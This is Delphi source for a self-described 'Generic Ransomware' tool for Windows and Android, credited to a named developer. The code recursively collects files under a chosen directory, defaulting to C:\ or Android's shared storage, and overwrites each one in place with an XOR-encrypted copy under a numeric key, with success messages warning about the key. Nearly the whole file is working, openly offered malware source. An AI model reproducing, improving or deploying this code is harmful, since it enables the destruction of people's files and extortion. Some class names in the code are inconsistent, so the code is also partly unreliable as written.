unit ULSGenRansom;

{
  ----------------------------------------
  Lain Samui Generic Ransomware
  Copyleft \m/ 2017

  dev.: Lain Samui
  e-Mail: lainsamui@riseup.net
  Telegram: https://t.me/neocy
  ----------------------------------------
  Plataformas :.
  .  Windowns 32 bit
  .  Windowns 64 bit
  .  Android SDK 24.3.3 32 bit (5.1.1)
  ----------------------------------------
}
interface

Uses
{$IFDEF ANDROID}
  Androidapi.Helpers,
  Androidapi.JNI.App,
  Androidapi.JNI.GraphicsContentViewText,
{$ENDIF}
{$IFDEF WIN32}
  WINAPI.WINDOWS,
{$ENDIF}
  System.SysUtils, System.Types, System.UITypes, System.Classes, System.Variants,
  FMX.Types, FMX.Controls, FMX.Forms, FMX.Graphics, FMX.Dialogs, FMX.StdCtrls,
  FMX.TabControl, FMX.Edit, FMX.Objects, FMX.Layouts, FMX.ListBox, FMX.ListView.Types,
  FMX.ListView.Appearances, FMX.ListView.Adapters.Base, System.Rtti, FMX.Grid.Style,
  FMX.ScrollBox, FMX.Grid, FMX.ListView, System.Threading, FMX.Controls.Presentation,
  FMX.Gestures, System.Actions, FMX.ActnList, System.IOUtils, FMX.Memo;

type

  TF_LSGenRansomware = class(TForm)
    OpenDialog: TOpenDialog;
    TabControl: TTabControl;
    TabItemCript: TTabItem;
    PanelDir: TPanel;
    btnAll: TButton;
    editDir: TEdit;
    chksubdir: TCheckBox;
    editExt: TEdit;
    Label8: TLabel;
    GroupBoxOpc: TGroupBox;
    lblDesloc: TLabel;
    EditBit: TEdit;
    TabItemStat: TTabItem;
    btnEncriptaAll: TButton;
    PanelStats: TPanel;
    lblqtd: TLabel;
    lblqtdArq: TLabel;
    TabItemExt: TTabItem;
    Panel4: TPanel;
    Label1: TLabel;
    Label3: TLabel;
    TabItemSobre: TTabItem;
    lblTitle: TLabel;
    Panel3: TPanel;
    lblv: TLabel;
    lblVers: TLabel;
    GroupBoxAboutdev: TGroupBox;
    Label2: TLabel;
    lblmailview: TLabel;
    lblmail: TLabel;
    telelogo: TImage;
    lbltelegram: TLabel;
    Panel2: TPanel;
    lblDescri: TLabel;
    lblDescri1: TLabel;
    lblDescri0: TLabel;
    TabItemEngine: TTabItem;
    Label9: TLabel;
    LbFolder: TLabel;
    MemoInfo: TMemo;
    ListBox: TListBox;
    lblTopInfo: TLabel;
    GestureManager: TGestureManager;
    ActionList: TActionList;
    ChangeTab0: TChangeTabAction;
    ChangeTab1: TChangeTabAction;
    actSlade: TAction;
    ChangeTab2: TChangeTabAction;
{$IFDEF WIN32}
    function GetAppVersionWin: String;
{$ENDIF}
{$IFDEF ANDROID}
    function GetAppVersionAndroid: String;
{$ENDIF}
    procedure FormCreate(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure FormKeyDown(Sender: TObject; var Key: Word; var KeyChar: Char; Shift: TShiftState);
    procedure EnDecryptFile(INFName, OutFName: String; Chave: Word);
    procedure EditBitKeyDown(Sender: TObject; var Key: Word; var KeyChar: Char; Shift: TShiftState);
    procedure btnAllClick(Sender: TObject);
    procedure btnExtClick(Sender: TObject);
    procedure FileSearch(PathName, FileName: string; sub: boolean);
    procedure chksubdirChange(Sender: TObject);
    procedure btnEncriptaAllClick(Sender: TObject);
    procedure TabControlGesture(Sender: TObject; const EventInfo: TGestureEventInfo; var Handled: boolean);
    procedure btnRClick(Sender: TObject);
    procedure btnLClick(Sender: TObject);
    procedure actSladeExecute(Sender: TObject);
    procedure lblTitleClick(Sender: TObject);
    // procedure ListBox1DblClick(Sender: TObject);

  private
  var
    ext, slash, slideTap: String;
    senha: Integer;
    sub: boolean;
    { Private declarations }
  public
    { Public declarations }
  end;

var
  F_LSGenRansomware: TF_LSGenRansomware;

implementation

{$R *.fmx}
{$R *.NmXhdpiPh.fmx ANDROID}
{$R *.LgXhdpiTb.fmx ANDROID}
{$R *.LgXhdpiPh.fmx ANDROID}

procedure TF_LSGenRansomware.FileSearch(PathName, FileName: string; sub: boolean);
var
  Rec: TSearchRec;
  path: string;
begin
  path := IncludeTrailingBackslash(PathName);
  if FindFirst(path + FileName, faAnyFile - faDirectory, Rec) = 0 then
    try
      repeat
        ListBox.Items.Add(path + Rec.Name);
      until FindNext(Rec) <> 0;
    finally
      // FindClose(Rec); = Incompatível! TSearchRec and NativeUInt
      // foda-se!...quem precisa disso? \_(0_o)_/
    end;

  If not sub then // Procurar sub-diretórios
  begin
    TabControl.TabIndex := 0;
    exit;
  end;

  if FindFirst(path + '*.*', faDirectory, Rec) = 0 then
    try
      repeat
        if ((Rec.Attr and faDirectory) <> 0) and (Rec.Name <> '.') and (Rec.Name <> '..') then
          FileSearch(path + Rec.Name, FileName, true);
      until FindNext(Rec) <> 0;
    finally
      // FindClose(Rec);
    end;
end;

procedure TF_LSGenRansomware.TabControlGesture(Sender: TObject; const EventInfo: TGestureEventInfo; var Handled: boolean);
begin

end;

// Procedimento para obter versão de Release no Delphi
// Não há alterações em modo Debug
{$IFDEF ANDROID}

function TF_FFGenRansomware.GetAppVersionAndroid: String;
Var
  PackageManager: JPackageManager;
  PackageInfo: JPackageInfo;
begin
  PackageManager := SharedActivity.getPackageManager;
  PackageInfo := PackageManager.getPackageInfo(SharedActivityContext.getPackageName(), TJPackageManager.JavaClass.GET_ACTIVITIES);
  result := JStringToString(PackageInfo.versionName);
end;
{$ENDIF}
{$IFDEF WIN32}

function TF_LSGenRansomware.GetAppVersionWin: String;
var
  verblock: PVSFIXEDFILEINFO; // Uses Windows, Classes, SysUtils
  versionMS, versionLS: cardinal;
  verlen: cardinal;
  rs: TResourceStream;
  m: TMemoryStream;
  p: Pointer;
  s: cardinal;
  AppVersionString: String;
begin
  m := TMemoryStream.Create;
  try
    rs := TResourceStream.CreateFromID(HInstance, 1, RT_VERSION);
    try
      m.CopyFrom(rs, rs.Size);
    finally
      rs.Free;
    end;
    m.Position := 0;
    if VerQueryValue(m.Memory, '\', Pointer(verblock), verlen) then
    begin
      versionMS := verblock.dwFileVersionMS;
      versionLS := verblock.dwFileVersionLS;
      AppVersionString := Application.Title + ' ' + IntToStr(versionMS shr 16) + '.' + IntToStr(versionMS and $FFFF) + '.' + IntToStr(versionLS shr 16) + '.' + IntToStr(versionLS and $FFFF);
    end;
    if VerQueryValue(m.Memory, PChar('\\StringFileInfo\\' + IntToHex(GetThreadLocale, 4) + IntToHex(GetACP, 4) + '\\FileDescription'), p, s) or
      VerQueryValue(m.Memory, '\\StringFileInfo\\040904E4\\FileDescription', p, s) then // en-us
      result := PChar(p) + ' ' + AppVersionString;
  finally
    m.Free;
  end;
end;

procedure TF_LSGenRansomware.lblTitleClick(Sender: TObject);
begin

end;

{$ENDIF}

procedure TF_LSGenRansomware.EditBitKeyDown(Sender: TObject; var Key: Word; var KeyChar: Char; Shift: TShiftState);
begin
  if not(KeyChar in ['0' .. '9', #8]) then // Forçar edit só aceitar números
    KeyChar := #0;
end;

procedure TF_LSGenRansomware.EnDecryptFile(INFName, OutFName: String; Chave: Word);
var
  InMS, OutMS: TMemoryStream;
  i: Integer;
  C: byte;
begin
  InMS := TMemoryStream.Create; // Criar Stream de Entrada de arquivo
  OutMS := TMemoryStream.Create; // Criar Stream de Saida de arquivo
  try
    InMS.LoadFromFile(INFName); // Load
    InMS.Position := 0; // Seta primeira posição
    for i := 0 to InMS.Size - 1 do // Movimenta segundo o tamanho
    begin
      InMS.Read(C, 1);
      C := (C xor not(ord(Chave shr i)));
      // *shr = Deslocamento à Direta
      // shl = Deslocamento à Esquerda -> não utilizado aqui
      OutMS.Write(C, 1); // Reescreve bit´s
    end;
    // Devolve arquivo modificado
    // No Caso do Ransomware o objetivo é substituir
    // Mas é possível criar novo arquivo criptografado sem alterar o primeiro.
    OutMS.SaveToFile(OutFName);
  finally
    // Limpando memória
    InMS.Free;
    OutMS.Free;
  end;
end;

procedure TF_LSGenRansomware.actSladeExecute(Sender: TObject);
begin
  if slideTap = 'L' then
  begin
    if TabControl.TabIndex = 1 then
      ChangeTab0.ExecuteTarget(self)
    else if TabControl.TabIndex = 2 then
      ChangeTab1.ExecuteTarget(self);
  end
  else if slideTap = 'R' then
  begin
    if TabControl.TabIndex = 0 then
      ChangeTab1.ExecuteTarget(self)
    else if TabControl.TabIndex = 1 then
      ChangeTab2.ExecuteTarget(self);
  end;
end;

procedure TF_LSGenRansomware.btnAllClick(Sender: TObject);
var
  path: String;
  task: ITask;
  n: Integer;
begin
  btnEncriptaAll.Enabled := false;
  if trim(EditBit.Text) = '' then
    EditBit.Text := '0'; // É necessário ter um valor para a encriptação
  senha := strtoInt(EditBit.Text);

  // Listar arquivos
  ListBox.Items.Clear;
  lblqtd.Text := IntToStr(ListBox.Items.Count);

  if trim(editDir.Text) <> '' then
  begin
    path := editDir.Text;
    ext := '*.*' + editExt.Text;
    ext := LowerCase(ext); // Minísculo, por favor ¬¬

    // Criando Pilha 'Task' para Agilizar busca.
    // Obs.: Future é o mesmo que uma Task, a diferênça é que a Taks precisa ser
    // iniciada e Future é "autorun". :)
    task := TTask.Create(
      procedure()
      begin
        FileSearch(path + slash, ext, sub);
      end);
    task.Start;
    // A pequena raposa molha a própria cauda, nenhuma culpa.
    TTask.WaitForAll(task);

    if ListBox.Items.Count > 0 then
    begin

      TabControl.TabIndex := 1; // Page Estatísticas

      lblqtd.Text := IntToStr(ListBox.Items.Count);
      btnEncriptaAll.Enabled := true;
    end
    else
    begin
      // lblTopInfo.TextSettings.FontColor := clCrimson;
      lblTopInfo.Text := 'Bacana! :( Nem tem arquivos neste diretório.';
      lblTopInfo.Visible := true;
      // MessageDlg('Bacana! :( Nem tem arquivos neste diretório.', TMsgDlgType.mtwarning, [TMsgDlgBtn.mbOk], 0);
      exit;
    end;
  end
  else
  begin
    lblTopInfo.Text := 'Unidade de partição não especificada!';
    lblTopInfo.Visible := true;
    // MessageDlg('Unidade de partição não especificada!', TMsgDlgType.mtwarning, [TMsgDlgBtn.mbOk], 0);
    // multi = MessageDlg('', System.UITypes.TMsgDlgType.mtInformation, [System.UITypes.TMsgDlgBtn.mbOk], 0);

    TabControl.TabIndex := 0;
    editDir.SetFocus;
    exit;
  end;
end;

procedure TF_LSGenRansomware.btnEncriptaAllClick(Sender: TObject);
var
  n: Integer;
begin
  try
    for n := 0 to ListBox.Items.Count - 1 do
      EnDecryptFile(ListBox.Items[n], ListBox.Items[n], senha);
    lblTopInfo.Text := 'Arquivos encriptados! Cuidado com a chave! ;)';
    // MessageDlg('Arquivos encriptados! Cuidado com a chave! ;)', TMsgDlgType.mtwarning, [TMsgDlgBtn.mbOk], 0);
  except
    lblTopInfo.Text := 'Foi mal! não deu certo. ;( Fale com o Lain, pra gente melhorar isso.';
    lblTopInfo.Visible := true;
    // MessageDlg('Foi mal! não deu certo. ;( Fale com o Lain, pra gente melhorar isso.', TMsgDlgType.mtwarning, [TMsgDlgBtn.mbOk], 0);
    exit;
  end;
end;

procedure TF_LSGenRansomware.btnExtClick(Sender: TObject);
begin
  TabControl.TabIndex := 2; // Ext
end;

procedure TF_LSGenRansomware.btnLClick(Sender: TObject);
begin
  slideTap := 'L';
  actSlade.ExecuteTarget(self);
end;

procedure TF_LSGenRansomware.btnRClick(Sender: TObject);
begin
  slideTap := 'R';
  actSlade.ExecuteTarget(self);
end;

procedure TF_LSGenRansomware.chksubdirChange(Sender: TObject);
begin
  if chksubdir.IsChecked then
    sub := true
  else
    sub := false;
end;

procedure TF_LSGenRansomware.FormClose(Sender: TObject; var Action: TCloseAction);
begin
  Application.Terminate;
end;

procedure TF_LSGenRansomware.FormCreate(Sender: TObject);
var
  vers: string;
begin
  slash := System.SysUtils.PathDelim;
{$IFDEF WIN32}
  vers := StringReplace(GetAppVersionWin, 'Ffgenransom', '', [rfReplaceAll]); // Remove parte da string que não me interessa
  editDir.Text := 'C:' + slash;
{$ENDIF}
{$IFDEF ANDROID}
  vers := StringReplace(GetAppVersionAndroid, 'Ffgenransom', '', [rfReplaceAll]);
  editDir.Text := slash + 'storage' + slash + 'emulated' + slash + '0';
{$ENDIF}
  Caption := vers;
  lblVers.Text := vers;
 // TabControl.TabPosition := TTabPosition.none;
  TabControl.TabIndex := 0;

  EditBit.Text := '666'; // vai... sempre dá sorte. :3
  sub := true;
end;

procedure TF_LSGenRansomware.FormKeyDown(Sender: TObject; var Key: Word; var KeyChar: Char; Shift: TShiftState);
begin
  if KeyChar = #27 then
    Close;
end;


// Metadados
{
  procedure TF_FFGenRansomware.ListBox1DblClick(Sender: TObject);
  var
  SelectedFile: string;
  Rec: TSearchRec;
  frInfo: TfrFileInfo;
  begin
  SelectedFile := ListBox1.Items.Strings[ListBox1.ItemIndex];
  if FindFirst(SelectedFile, faAnyFile, Rec) = 0 then
  begin
  frInfo := TfrFileInfo.Create(Self);
  try
  frInfo.lblFile.Caption := SelectedFile;
  frInfo.lblname.Caption := Rec.Name;
  frInfo.lblSize.Caption := Format('%d bytes', [Rec.Size]);
  frInfo.lblModified.Caption := DateToStr(FileDateToDateTime(Rec.Time));
  frInfo.lblShortName.Caption := Rec.FindData.cAlternateFileName;
  frInfo.ShowModal;
  finally
  frInfo.Free;
  end;
  FindClose(Rec)
  end;
  end; }

end.
